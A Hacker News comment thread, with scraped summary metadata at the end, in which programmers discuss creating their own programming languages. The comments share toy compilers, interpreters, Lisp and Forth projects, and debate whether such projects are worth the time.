https://en.wikipedia.org/wiki/Greenspun%27s_tenth_rule reply efilife 3 hours agorootparentIs this a joke I'm not getting? Any examples of such software? reply steeleduncan 2 hours agorootparentI think the point is that - you write some piece of software - then you add a straightforward configuration language - then you add variables because you don't want too much copy/paste - then you add if statements to allow conditional configuration - then you add loops because you are sick of seeing configuration that consists of unrolled loops - ... At some point your configuration system is Turing complete, so could be considered a programming language. However it was never designed as such, so it is not a horrible one TeX would be a good example of this. Ansible playbooks are (I believe) Turing complete, and YAML itself has such a huge spec, that if it isn't Turning complete and/or self aware already, I can't imagine it'll be long before it is reply saghm 15 minutes agorootparentprevI think the initial intent of the quote was to ridicule non-lisp users for reinventing the wheel, but to me it always reads as a fundamental misunderstanding of the fact that programming language constraints are _features_ rather than downsides. reply jimbokun 34 minutes agorootparentprevThe joke is that C and C++ lack important features found in Common Lisp, so real world programs end up adding those features indirectly as the size of the program grows. reply jjtheblunt 2 hours agorootparentprevIt's a famous quote and it is of course meant to be humorous, and a statement of how vast the functionality of common lisp is (huge spec and book) reply nosioptar 2 hours agorootparentprevRatpoison, a tiling window manager for Linux, did this. The devs hit the point where they realized they were basically implementing parts of Lisp to allow more configuration. They ended up creating StumpWM in Common Lisp to be like Ratpoison if it allowed more configuration. reply bunderbunder 1 hour agoparentprevIn fairness, this is also every modern Web browser's sin. reply norir 2 hours agoprevI think many people underestimate how easy it is to get started writing a language. It is a bit like improvising music: it's just one note followed by another note followed by another. Almost any intermediate level programmer can write a program that parses a hello, world program and translates it into the language they already know. Once you have hello, world, you add features. Eventually you realize you made mistakes in your initial design and start over but your second design will be better than the first because of the knowledge that you now have. After enough iterations, you will have a good language that you like (even though it won't be everyone's cup of tea). reply JohnMakin 3 hours agoprevOne of the most fundamental experiences I ever had was attempting a graduate level course at the end of a long series on compilers. You really get an eye opening view of how languages are translated into the language the machine understands. After going through a few toy languages and then finally tackling creating a simple JVM, here is the #1 thing I would go back to myself and scream until I was blue - Make your initial grammar SUPER simple. Like, don't go guns blazing and try to add all these cool features you saw in another language or always thought about. Start stupid, stupid simple, get that working, then build on top of it. reply lioeters 2 hours agoparentThis is why the Lisp syntax is a great candidate for an exercise in making your own language. For example, Make a Lisp. https://github.com/kanaka/mal It's simple to lex and parse into an abstract syntax tree, so you can get on with exploring more interesting aspects of programming beyond the mere syntax. (Not to say that there aren't interesting aspects of grammar and innovative syntax, but those can probably be explored later on as macros.) Last time I created a toy language, I implemented a C-like infix syntax but still used a Lisp evaluator at its core from a previous project. reply JohnMakin 2 hours agorootparent> It's simple to lex and parse into an abstract syntax tree, There are some \"cheats\" for this, tools like ANTLR etc. that are good at generating parsers from a particular grammar. But of course, I think a beginner should try to do this on their own to get a feel for it. Personally, for me, I do find writing parsers a little tedious and not the most fun part of making a language. reply whartung 2 hours agoparentprevFor many simple languages, the most complex construct is the expression. Lots of things come to light there. Lots of recursion/fun with stacks, operator precedence, the type system, parameter passing. Pretty much a good solid chunk of language is wrapped up in expressions. Get expressions working, and the rest starts to readily fall into place. reply mjhay 38 minutes agoprev> It will be a bad language, and that's okay This same advice could be applied to most hobbies. It doesn't have to be good, and it certainly doesn't have to make money. It just has to be fun and rewarding. If you learn something, even better. > Go Forth, make something fun *golfclap* reply stevekemp 18 minutes agoparentAnd here's my tutorial FORTH, based upon a thread from hacker news: https://github.com/skx/foth Forth is always appealing, whether literally, or in puns. reply Jeaye 2 hours agoprevAnyone wanting to work on a new language is most welcome to help out on mine: jank. It's a native Clojure dialect on LLVM with C++ interop and all the JIT goodies one expects from a lisp. jank is currently part of a mentorship program, too, so you can join (for sree) and get mentored by me on C++, compiler dev, and Clojure runtime internals. 1. https://jank-lang.org/ 2. https://clojureverse.org/t/announcing-the-scicloj-open-sourc... reply cvoss 3 hours agoprevI've dreamed about making my own language for about 10 years or so. Started out just messing around. My vision for what it would be and its purpose has changed over time. About 2 years ago, I \"got serious\" about designing and implementing it, though that doesn't mean I've spent a serious amount of time on it yet. But it's happening! It's a language for the domain of writing and verifying formal proofs. Basically, I didn't enjoy the experience of working with the couple of proof assistants I tried, so I'm doing my own thing. My objective is to create a language where I can document \"everything I know\" about math, if for no other reason than to prove to myself that I know those things, and to return to that knowledge if it ever slips away. It's so much fun! reply alexwashere_ 2 hours agoparentSounds neat - got any example code you could share? reply graypegg 2 hours agoprevI think maybe a good middle ground is write an interpreter for an already spec'd esoteric language like brainfuck. [0] It's really fun. Brainfuck specifically is great because there's a lot to optimize with only 6 total operations. (An example, multiplication has to be done as repeated addition in a loop, make a multiply AST node! [1]) and you could knock out a (BF => AST => Anything you want) compiler in an afternoon! Bonus, there's a lot of really impressive brainfuck scripts out there. Nothing compares to seeing your compiler take in some non-sense ascii, and spit out an application that draws the mandlebrot fractal. [0] https://esolangs.org/wiki/Brainfuck [1] https://github.com/graypegg/unfuck/blob/master/src/optimiser... reply mckn1ght 1 hour agoparentSimilarly, I’ve been thinking lately about forking Swift, because there’s a lot I love about the language, but also a lot of, IMO, unnecessary sugar and redundant surface area. reply Doches 1 hour agoprev> It's special that we make our own tools I've always taken this to heart, but not necessarily with programming languages. Any piece of software that helps run my business that I can reasonably make and maintain myself, I do. I build my own CI/CD app, orchestration/deployment tool, task planner, bug tracker, release note editing & publishing tools, blog editor, logstash/viewer for exceptions, etc. Does building (and especially maintaining!) all of these tools take up a lot of time, and distract me from the primary business of building the software that I actually sell? Sure, of course it does. But it also keeps me fresh and forces me to expand the scope of ideas that I regularly work with, and keeps me from becoming \"that guy who makes that one app\" and who isn't capable of moving outside of his comfort zone. And while that doesn't (yet) extend to building my own tools in my own languages, it certainly does extend to writing my own DSLs for things like configuration management or infrastructure. My tools may be homerolled and second-rate, but they're mine (dammit!) and -- this part is important -- no one can take them away from me or catch me out with a licensing rug-pull. reply atum47 43 minutes agoprevLong time ago I was stuck at the airport and I end up writing a interpreter in Python. I stop the project at arithmetic, so, basically a fancy calculator. After that I saw a really interesting video about Shunting Yard algorithm, so I gave that a got as well [1]. At some point, I want to try to write a programming language, I know a little bit about assembly but it is most theory; haven't done much programming using it (only basic stuff, back in college) but I find it fascinating. 1 - https://github.com/victorqribeiro/shuntingYard reply cardiffspaceman 1 hour agoprevLandin wrote a paper called, \"The next seven hundred programming languages.\"[1] The paper predicts quite a bit of the present. So I named my programming language, DCC. [1] https://www.cs.cmu.edu/~crary/819-f09/Landin66.pdf reply rzimmerman 3 hours agoprevI spent time on a compile-to-JS language and found it very rewarding: https://github.com/rzimmerman/kal This was before async/generators were added to JS and callback hell was quite real. I wanted to shape it in the way I’d learned to program in Visual Basic. Very human readable. The result is no longer useful, but it was a fun goal to have the compiler compile itself. reply kstenerud 2 hours agoprevI haven't made a programming language (and never will), but I did build a BNF-inspired metalanguage for describing text and binary formats to scratch the itch of trying to describe a binary data format I was developing: The metalanguage: https://dogma-lang.org/ It's even got a syntax highlighter: https://marketplace.visualstudio.com/items?itemName=ksteneru... The binary format I wanted to describe: https://github.com/kstenerud/concise-encoding/blob/master/cb... reply zX41ZdbW 2 hours agoprevIt will be good to add \"Programming Language Checklist\" to the references: https://www.mcmillen.dev/language_checklist.html reply pclmulqdq 2 hours agoprevOne project I started recently was a dice rolling discord bot. Halfway into it, I realized that I really wanted an AST for dice roll expressions to avoid a whole bunch of bugs and special cases, so that project is now mainly a compiler. More seriously, I have been very tempted recently to make a programming language specifically for cryptography, but I am holding off until I can no longer stand assembly. reply PodgieTar 2 hours agoprevI made a little toy compiler for a university project many years back, and I agree with the article - it's quite a nice way to get hands on with syntax and helps you think a bit more deeply about what is actually happening. https://github.com/Podginator/Rattle/tree/master It used JavaCC, which I found to be a pretty simple way to get up and running. I also worked a job that used yacc to create their own DSL for a piece of software. Same thing, really. Easy enough to get up and running, and messing around with. reply morning-coffee 2 hours agoprevThe timing of this article is great for me as lately I'm fascinated by the Forth language and the simplicity behind its apparent strangeness. I've been tempted to start playing with similar ideas just for fun. (https://ratfactor.com/forth/the_programming_language_that_wr... is a great read, btw.) reply news_to_me 1 hour agoprevThis is so true. I feel like I've learned more about programming in the last two years making Cassette[1] than in the past decade of professional software development. Every developer should make a language at some point. I want to see everyone's weird, half-baked languages! I want to hear about what other people struggled with, and the tradeoffs they've made! [1]: https://cassette-lang.com reply giancarlostoro 1 hour agoparentThis looks neat. I tried VB.NET a few weeks ago, and felt like it was mostly pointless since almost all resources are done in C# and so you have to translate from C# to VB.NET anytime you want to do anything, which can be a bit of a pain. But one thing I really liked was the \"begin end\" type of code blocks. reply TrackerFF 1 hour agoprevIn woodworking you make tools all the time, namely jigs. So much of woodworking, whether it is making cabinets, musical instruments, art, or whatever involves making your jigs, templates, and a bunch of other stuff. Hell, even larger projects like complex workbenches. You rarely make actual tools, though. It's unheard of that a woodworking goes on to make their own router, band saw, planer, jointer, chisels, etc. - but you can learn a ton by starting with the absolute bare basics, before investing a ton in expensive tools. Kind of makes me wonder where this analogy fits (if at all) in the world of software engineering: Some tools are probably either too complex, or don't really make sense making, if you're going to use it to actually build something. I mean, it is a good intellectual exercised for the curious, and you pick up a bunch of things underway, but at some point it is probably good to ask yourself if your time is better spent on something else. reply elashri 2 hours agoprevIt is always my dream to write an interpreter for my imaginary language that does provide a more human readable syntax to write scripts. It is basically language that compiles to bash because it is everywhere but I really hate writing bash although I write bash/zsh code a lot. Yes I can use python (other scripting language for that) but this is not cool as writing your own programming language and also you don't always have access to python environment. Bash just runs everywhere (at least for me). It is also my motivation to learn about compilers and how they work. reply DeborahWrites 1 hour agoprevEvery ~3yrs an article like this floats across my screen. Every time, I think it sounds SO fun. And then do nothing. Given this time I have the excellent excuse of a new job, I don't expect to break the trend this year. But one day . . . one day . . . reply bsnnkv 1 hour agoprevMy version of this was building my own tiling window manager (I also ended up building my own hotkey daemon with its own syntax and parser along the way) reply looneysquash 2 hours agoprevAre there some good resources for learning type theory? reply allanren 1 hour agoprevSeems the future of programming language is natural language reply itishappy 1 hour agoparentGood news, you can make new natural languages too! reply pansa2 3 hours agoprevhttps://news.ycombinator.com/item?id=41234863 reply AnimalMuppet 3 hours agoprevNo. No, I really shouldn't. Yes, I might gain a better understanding of how things work. I can do that lots of ways; others may be a better use of my limited time. (For that matter, doing other things that don't give me a better understanding of how things work may be a better, more valuable use of my limited time.) Yes, I could get a language that fits what I need better... in theory. In practice, it would be buggy, inconsistent, and incompletely implemented. It would not actually fit what I need better than existing languages. reply whartung 2 hours agoparentYou should write a language for the same reason you should write a game. It's not hard for a game to touch all sorts of corners of the computer world that routine work will never come near. Games are great because they're easy to focus on, you know pretty much precisely what you want it to do. They also tend to be made of small parts, yet extensible, in terms of adding features if you still have wind in your sails. And if not, hey, you have a few more data structures under your belt. Who knows when those may come in handy again. Languages are similar. Get past a few \"hard parts\" and they can be a fun ride. For extra fun, put the language into your game. Dog food for everyone. reply kemitche 2 hours agoparentprevThe article doesn't claim that you should make a language and actually use it - the author focuses on the learning experience. He makes valid points. No, it's probably not the right learning experience for everyone (clearly, it won't be yours), but there's definitely value in it for some people. And if reading the article nudges a few more people to take that learning dive, I think that's a good thing. reply pc86 3 hours agoparentprevHow is using a language that is buggy, inconsistent, and incomplete any better than use a better language to write an app that is buggy, inconsistent, and incomplete? Checkmate. reply anta40 2 hours agorootparentDifferent context, though. I'm pretty sure that my Java/Go/Kotlin apps are buggy. So what, bugs are always exist. Just fix them. But as a language user, it's not my job to fix compiler/RTL library bugs. Write a bug report on GitHub, instead. But when you are designing a programming language and writing the interpreter/compiler, well you are on your own :D reply AnimalMuppet 2 hours agorootparentprevYes, my apps are buggy, inconsistent, and incomplete (as are all apps). But they're less bad than my language would be, because they're my day job, and my language wouldn't be. So, not checkmate at all. reply jbs789 2 hours agorootparentprevUmm if we are looking for analogies. I would prefer a castle built on rock rather than one built on sand. reply TeMPOraL 2 hours agorootparent> rather than one built on sand Well, that is exactly what your app is if it's built on modern \"state of the art\" tooling - you're probably pulling in a thousand trivial dependencies; every day, something gets updated, and you're rolling dice on whether or not your program will build. Writing your own language to build your app in creates a lot of big problems, but not those particular problems. reply PhilipRoman 2 hours agorootparentprevBetter than a sandcastle built on a rock, I suppose... reply napierzaza 3 hours agoprev [–] I remember when I was making music. It was really fun and engaging. Then I learned about microcontroller projects for making my own synthesizer. It was fun and it took me two years to build my synth. At the end of it I had not made music for long enough to have lost the knack, and I was sick of even learning how to use the synth because I was worried I would have to debug it. So I just didn't make music ever again. Why consume yourself with some sub project that goes nowhere? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Creating a new programming language offers valuable learning opportunities, teaching about grammars, language design, parsing, and runtime execution.",
      "The process helps understand why existing languages are designed the way they are and allows for experimentation with different paradigms and features.",
      "Resources like \"Crafting Interpreters\" and books such as \"Introduction to Compilers and Language Design\" can guide beginners through the process of language creation."
    ],
    "commentSummary": [
      "Creating a new programming language often begins with simple functionality but can evolve into a complex project involving an interpreter.",
      "Developers frequently share experiences of accidentally creating interpreters, learning about parsing, syntax, and language design in the process.",
      "Despite the challenges, building a language can be a rewarding and educational side project, providing valuable insights into programming and software design."
    ],
    "points": 124,
    "commentCount": 71,
    "retryCount": 0,
    "time": 1723558374
  }
]
